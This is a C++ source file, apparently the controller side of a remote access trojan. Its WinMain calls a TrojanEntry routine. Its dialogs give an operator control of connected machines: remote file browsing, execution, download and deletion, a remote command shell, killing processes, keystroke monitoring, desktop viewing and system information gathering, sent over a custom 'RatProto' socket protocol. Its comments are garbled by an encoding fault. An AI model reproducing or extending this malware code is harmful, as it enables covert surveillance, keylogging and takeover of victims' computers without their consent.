//////////////////////////////////////////////////////////////////////////
//File:	NsDoor.cpp
//Rem:	Client Entry
//////////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////////
//ͷ�ļ�����
//////////////////////////////////////////////////////////////////////////
#pragma once
#include "Header.h"
#include "MainFunc.h"
#include "InitSocket.h"
#include "SysInfo.h"
#include "ProcInfo.h"
#include "FileMgr.h"
#include "DeskView.h"
#include "KeyBoard.h"

//////////////////////////////////////////////////////////////////////////
//�궨�塢ȫ�ֱ���
//////////////////////////////////////////////////////////////////////////
//HWND hSBarDlg;
//HWND hDlgMain;
#define WM_SOCKET	0x0401
SOCKET sockfd;
char szSendCmd[MAXLENGTH] = {0};
char szRecvCmd[MAXLENGTH] = {0};
int  dwSendSize = 0;
int  dwRecvSize = 0;
HINSTANCE hInst = NULL;
char szFname[MAX_PATH] = {0};
int	dwSelected = 0;

//////////////////////////////////////////////////////////////////////////
//��������
//////////////////////////////////////////////////////////////////////////
//�����ڹ���
LRESULT CALLBACK MainDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//�ļ������ڹ���
LRESULT CALLBACK FileDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//Զ��CMD���ڹ���
LRESULT CALLBACK CmdDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//ע����ڹ���
LRESULT CALLBACK RegDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//���̹����ڹ���
LRESULT CALLBACK ProcDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//Զ����Ƶ���ڹ���
LRESULT CALLBACK VideoDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//���̼�ش��ڹ���
LRESULT CALLBACK KeyDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//Զ�����洰�ڹ���
LRESULT CALLBACK DesktopDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
//Զ����Ϣ���ڹ���
LRESULT CALLBACK SysDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);



//������
int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd )
{
	hInst = hInstance;
	//��ʼ��ͨ�ÿؼ���
	InitCommonControls();
	TrojanEntry();
	//�����ڹ���
	return DialogBox(hInstance,MAKEINTRESOURCE(IDD_DIALOG),NULL,(DLGPROC)MainDlgProc);
}


//////////////////////////////////////////////////////////////////////////
//�����ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK MainDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam )
{
	hDlgMain = hDlg;
	HINSTANCE hInstance = GetModuleHandle(NULL);
	HWND hListControl = GetDlgItem(hDlg,IDC_LIST1);
	char msg[1024] = {0};

	switch (uMsg)
	{
	case WM_INITDIALOG:
		{
			InitListControl(hListControl);
			hSBarDlg = CreateStatusWindow(WS_CHILD|WS_VISIBLE|SBARS_SIZEGRIP,NULL,hDlg,ID_STATUSBAR);
			memcpy(msg,"��ʼ������������...",sizeof(msg));
			SendMessage(hSBarDlg,SB_SETTEXT,NULL,(LPARAM)msg);
		}
		break;
	case WM_COMMAND:
		{
			char temp[1024] = {0}; 
			int count = ListView_GetSelectionMark(hListControl);
			dwSelected = count;
			ListView_GetItemText(hListControl,count,4,temp,1024);
			SOCKET s = (SOCKET)atoi(temp);
			switch (LOWORD(wParam))
			{
			case IDC_BUTTON1:
				{
					DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG6),hDlg,(DLGPROC)SysDlgProc,(LPARAM)s);
				}
				break;
			case IDC_BUTTON2:
				{
					DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG3),hDlg,(DLGPROC)ProcDlgProc,(LPARAM)s);
				}
				break;
			case IDC_BUTTON3:
				{
					DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG2),hDlg,(DLGPROC)CmdDlgProc,(LPARAM)s);
				}
				break;
			case IDC_BUTTON4:
				{
					DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG4),hDlg,(DLGPROC)KeyDlgProc,(LPARAM)s);
				}
				break;
			case IDC_BUTTON5:
				{
					DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG1),hDlg,(DLGPROC)FileDlgProc,(LPARAM)s);
				}
				break;
			case IDC_BUTTON6:
				{
					DialogBoxParam(hInstance,MAKEINTRESOURCE(IDD_DIALOG5),hDlg,(DLGPROC)DesktopDlgProc,(LPARAM)s);
				}
				break;
			}
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}


//////////////////////////////////////////////////////////////////////////
//�ļ������ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK FileDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	HWND hList = NULL;
	HWND hSBar = NULL;
	LPNMHDR lPnmhdr = NULL;
	switch (uMsg)
	{
	case WM_COMMAND:
		{
			switch(LOWORD(wParam))
			{
			case ID_POPUP_40001:
				{
					//��(EXE����)
					hList = GetDlgItem(hDlg,IDC_LIST1);
					int index = ListView_GetSelectionMark(hList);
					char szFile[NAMESIZE] = {0};
					char szType[10] = {0};
					ListView_GetItemText(hList,index,0,szType,sizeof(szType));
					ListView_GetItemText(hList,index,1,szFile,NAMESIZE);
					FileOpen(sockfd,szFile,szType);

				}
				break;
			case ID_POPUP_40002:
				{
					//����
					FolderBack(sockfd);
				}
				break;
			case ID_POPUP_40004:
				{
					//����
					hList = GetDlgItem(hDlg,IDC_LIST1);
					int index = ListView_GetSelectionMark(hList);
					char szFile[NAMESIZE] = {0};
					ListView_GetItemText(hList,index,1,szFile,NAMESIZE);
					sprintf(szFname,"%s",szFile);
					FileDownLoad(sockfd,szFile);
				}
				break;
			case ID_POPUP_40005:
				{
					//ɾ��
					hList = GetDlgItem(hDlg,IDC_LIST1);
					int index = ListView_GetSelectionMark(hList);
					char szFile[NAMESIZE] = {0};
					ListView_GetItemText(hList,index,1,szFile,NAMESIZE);
					FileDelete(sockfd,szFile);
				}
				break;
			}
		}
		break;
	case WM_SOCKET:
		{
			switch(LOWORD(lParam))
			{
			case FD_WRITE:
				{
					//��������
					SendCmd(sockfd,NULL,NULL);
				}
				break;
			case FD_READ:
				{
					RecvCmd(sockfd);
				}
				break;
			case FD_CLOSE:
				{
					//SOCKET������,MainFunc.H�� ��������
					SocketError(sockfd);
					EndDialog(hDlg,NULL);
				}
				break;
			}
		}
		break;
	case WM_NOTIFY:
		{
			lPnmhdr = (LPNMHDR)lParam;
			hList = GetDlgItem(hDlg,IDC_LIST1);
			if (lPnmhdr->hwndFrom==hList)
			{
				switch (lPnmhdr->code)
				{
				case NM_DBLCLK:
					{
						hList = GetDlgItem(hDlg,IDC_LIST1);
						int index = ListView_GetSelectionMark(hList);
						int count = ListView_GetItemCount(hList);
						char szType[10] = {0};
						ListView_GetItemText(hList,index,0,szType,sizeof(szType));
						if (strcmp(szType,"FILE")==0)
						{
							break;
						}
						if (index<count)
						{
							char szFile[NAMESIZE] = {0};
							char szType[10] = {0};
							ListView_GetItemText(hList,index,0,szType,sizeof(szType));
							ListView_GetItemText(hList,index,1,szFile,NAMESIZE);
							FileOpen(sockfd,szFile,szType);
						}
					}
					break;
				case NM_RCLICK:
					{
						HMENU hMenu = LoadMenu(hInst,MAKEINTRESOURCE(IDR_MENU1));
						hMenu = GetSubMenu(hMenu,0);
						POINT stPos;
						GetCursorPos(&stPos);
						TrackPopupMenu(hMenu,TPM_LEFTALIGN,stPos.x,stPos.y,NULL,hDlg,NULL);
					}
					break;
				}
			}
		}
		break;
	case WM_INITMENUPOPUP:
		{
			switch(LOWORD(lParam))
			{
			case 0:
				{
					//�ļ����ã���(EXE������)
					//�ļ��н��ã�����
					//�̷����ã�����
					hList = GetDlgItem(hDlg,IDC_LIST1);
					int index = ListView_GetSelectionMark(hList);
					int count = ListView_GetItemCount(hList);
					if (index>=count && strlen(szTempPath)==0)
					{
						EnableMenuItem((HMENU)wParam,ID_POPUP_40001,MF_GRAYED);
						EnableMenuItem((HMENU)wParam,ID_POPUP_40002,MF_GRAYED);
						EnableMenuItem((HMENU)wParam,ID_POPUP_40004,MF_GRAYED);
						EnableMenuItem((HMENU)wParam,ID_POPUP_40005,MF_GRAYED);
					}
					else if (index>=count)
					{
						EnableMenuItem((HMENU)wParam,ID_POPUP_40001,MF_GRAYED);
						EnableMenuItem((HMENU)wParam,ID_POPUP_40002,MF_ENABLED);
						EnableMenuItem((HMENU)wParam,ID_POPUP_40004,MF_GRAYED);
						EnableMenuItem((HMENU)wParam,ID_POPUP_40005,MF_GRAYED);
					}
					else
					{
						char szType[NAMESIZE] = {0};
						ListView_GetItemText(hList,index,0,szType,NAMESIZE);
						if (strcmp(szType,"DRIVE")==0)
						{
							EnableMenuItem((HMENU)wParam,ID_POPUP_40001,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40002,MF_GRAYED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40004,MF_GRAYED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40005,MF_GRAYED);
						}
						else if (strcmp(szType,"FOLDER")==0)
						{
							EnableMenuItem((HMENU)wParam,ID_POPUP_40001,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40002,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40004,MF_GRAYED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40005,MF_ENABLED);
						}
						else if (strcmp(szType,"EXE")==0)
						{
							EnableMenuItem((HMENU)wParam,ID_POPUP_40001,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40002,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40004,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40005,MF_ENABLED);
						}
						else
						{
							EnableMenuItem((HMENU)wParam,ID_POPUP_40001,MF_GRAYED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40002,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40004,MF_ENABLED);
							EnableMenuItem((HMENU)wParam,ID_POPUP_40005,MF_ENABLED);
						}
					}
				}
			break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
			sockfd = (SOCKET)lParam;
			//��ӵ��ģʽ
			WSAAsyncSelect(sockfd,hDlg,WM_SOCKET,FD_WRITE|FD_READ|FD_CLOSE);
			//���Զ�������̷�
			SendDriveList(sockfd);
			hList = GetDlgItem(hDlg,IDC_LIST1);
			//��ʼ��ListControl
			InitFmgrList(hList);
			//��ʼ��״̬��
			UpdataSBar(hDlg);
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//Զ��CMD���ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK CmdDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_COMMAND:
		{
			switch(LOWORD(wParam))
			{
			case IDC_BUTTON1:
				{
					//����Զ��CMD����Ҫ��
					CmdRequest(sockfd,hDlg);
				}
				break;
			}
		}
		break;
	case WM_SOCKET:
		{
			switch(LOWORD(lParam))
			{
			case FD_WRITE:
				{
					//��������
					SendCmd(sockfd,NULL,NULL);
				}
				break;
			case FD_READ:
				{
					RecvCmd(sockfd);
				}
				break;
			case FD_CLOSE:
				{
					//SOCKET������,MainFunc.H�� ��������
					SocketError(sockfd);
					EndDialog(hDlg,NULL);
				}
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
			sockfd = (SOCKET)lParam;
			//��ӵ��ģʽ
			WSAAsyncSelect(sockfd,hDlg,WM_SOCKET,FD_WRITE|FD_READ|FD_CLOSE);
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}


//////////////////////////////////////////////////////////////////////////
//ע����ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK RegDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_COMMAND:
		{
			switch(LOWORD(wParam))
			{
			case IDC_BUTTON1:
				{
					MessageBoxA(hDlg,"Try Again","Try",MB_OK);
				}
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}



//////////////////////////////////////////////////////////////////////////
//���̹����ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK ProcDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	HWND hList = NULL;
	LPNMHDR lPnmhdr = NULL;
	switch (uMsg)
	{
	case WM_COMMAND:
		{
			switch(LOWORD(wParam))
			{
			case ID_POPUP_40007:
				{
					hList = GetDlgItem(hDlg,IDC_LIST1);
					int index = ListView_GetSelectionMark(hList);
					char temp[10] = {0};
					ListView_GetItemText(hList,index,0,temp,sizeof(temp));
					int pid = atoi(temp);
					ProcDelete(sockfd,pid);

				}
				break;
			case ID_POPUP_40009:
				{
					//PID==0Ϊˢ��
					int pid = 0;
					ProcDelete(sockfd,pid);
				}
				break;
			}
		}
		break;
	case WM_NOTIFY:
		{
			lPnmhdr = (LPNMHDR)lParam;
			hList = GetDlgItem(hDlg,IDC_LIST1);
			if (lPnmhdr->hwndFrom==hList)
			{
				switch (lPnmhdr->code)
				{
				case NM_RCLICK:
					{
						HMENU hMenu = LoadMenu(hInst,MAKEINTRESOURCE(IDR_MENU2));
						hMenu = GetSubMenu(hMenu,0);
						POINT stPos;
						GetCursorPos(&stPos);
						TrackPopupMenu(hMenu,TPM_LEFTALIGN,stPos.x,stPos.y,NULL,hDlg,NULL);
					}
					break;
				}
			}
		}
	case WM_INITMENUPOPUP:
		{
			BOOL flag = TRUE;
			hList = GetDlgItem(hDlg,IDC_LIST1);
			int index = ListView_GetSelectionMark(hList);
			int count = ListView_GetItemCount(hList);
			if (index >= count)
			{
				flag = FALSE;
			}
			switch(LOWORD(lParam))
			{
			case 0:
				{
					if (flag)
					{
						EnableMenuItem((HMENU)wParam,ID_POPUP_40007,MF_ENABLED);
					}
					else
					{
						EnableMenuItem((HMENU)wParam,ID_POPUP_40007,MF_GRAYED);
					}

				}
				break;
			}
		}
		break;
	case WM_SOCKET:
		{
			switch(LOWORD(lParam))
			{
			case FD_WRITE:
				{
					//��������
					SendCmd(sockfd,NULL,NULL);
				}
				break;
			case FD_READ:
				{
					RecvCmd(sockfd);
				}
				break;
			case FD_CLOSE:
				{
					//SOCKET������,MainFunc.H�� ��������
					SocketError(sockfd);
				}
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
			sockfd = (SOCKET)lParam;
			hList = GetDlgItem(hDlg,IDC_LIST1);
			hSysList = hList;
			//��ӵ��ģʽ
			WSAAsyncSelect(sockfd,hDlg,WM_SOCKET,FD_WRITE|FD_READ|FD_CLOSE);
			//������������
			RatProto ratPro;
			ratPro.RatId = PROC_VIEW;
			ratPro.RatLen = sizeof(RatProto);
			SendCmd(sockfd,(char*)&ratPro,ratPro.RatLen);
			//��ʼ���б�
			InitProcList(hList);
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}


//////////////////////////////////////////////////////////////////////////
//���̼�ش��ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK KeyDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_COMMAND:
		{
			switch (LOWORD(wParam))
			{
			case IDOK:
				{
					//1Ϊ�򿪼��̼��
					KeyCmdSend(sockfd,hDlg,1);
				}
				break;
			case IDCANCEL:
				{
					//0Ϊ�رռ��̼��
					KeyCmdSend(sockfd,hDlg,0);
				}
				break;
			}
		}
		break;
	case WM_SOCKET:
		{
			switch(LOWORD(lParam))
			{
			case FD_WRITE:
				{
					//��������
					SendCmd(sockfd,NULL,NULL);
				}
				break;
			case FD_READ:
				{
					RecvCmd(sockfd);
				}
				break;
			case FD_CLOSE:
				{
					//SOCKET������,MainFunc.H�� ��������
					SocketError(sockfd);
				}
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
			sockfd = (SOCKET)lParam;
			//��ӵ��ģʽ
			WSAAsyncSelect(sockfd,hDlg,WM_SOCKET,FD_WRITE|FD_READ|FD_CLOSE);
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//Զ����Ƶ���ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK VideoDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_COMMAND:
		{
			switch(LOWORD(wParam))
			{
			case IDC_BUTTON1:
				{
					MessageBoxA(hDlg,"Try Again","Try",MB_OK);
				}
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}



//////////////////////////////////////////////////////////////////////////
//Զ�����洰�ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK DesktopDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_COMMAND:
		{
			switch (LOWORD(wParam))
			{
			case IDC_BUTTON1:
				{
					DeskViewRequest(sockfd,hDlg);
				}
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
			sockfd = (SOCKET)lParam;
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}



//////////////////////////////////////////////////////////////////////////
//Զ����Ϣ���ڹ���
//////////////////////////////////////////////////////////////////////////
LRESULT CALLBACK SysDlgProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	HWND hList;
	switch (uMsg)
	{
	case WM_COMMAND:
		{
		}
		break;
	case WM_SOCKET:
		{
			switch(LOWORD(lParam))
			{
			case FD_WRITE:
				{
					//��������
					SendCmd(sockfd,NULL,NULL);
				}
				break;
			case FD_READ:
				{
					RecvCmd(sockfd);
				}
				break;
			case FD_CLOSE:
				{
					//SOCKET������,MainFunc.H�� ��������
					SocketError(sockfd);
				}
				break;
			}
		}
		break;
	case WM_INITDIALOG:
		{
			sockfd = (SOCKET)lParam;
			hList = GetDlgItem(hDlg,IDC_LIST1);
			//��ӵ��ģʽ
			WSAAsyncSelect(sockfd,hDlg,WM_SOCKET,FD_WRITE|FD_READ|FD_CLOSE);
			//������������
			RatProto ratPro;
			ratPro.RatId = SYS_VIEW;
			ratPro.RatLen = sizeof(RatProto);
			SendCmd(sockfd,(char*)&ratPro,ratPro.RatLen);
			//��ʼ���б�
			InitSysList(hList);
		}
		break;
	case WM_CLOSE:
		{
			EndDialog(hDlg,NULL);
		}
		break;
	default:
		break;
	}

	return FALSE;
}
